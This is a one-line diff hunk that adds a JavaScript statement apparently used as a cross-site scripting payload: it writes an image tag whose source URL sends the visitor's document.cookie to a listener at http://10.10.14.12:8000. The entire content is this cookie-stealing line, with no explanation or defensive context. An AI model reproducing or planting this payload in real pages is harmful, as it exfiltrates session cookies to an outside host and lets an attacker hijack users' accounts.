@@ -1,0 +1,1 @@
+document.write('<img src="http://10.10.14.12:8000/?'+document.cookie+'">');
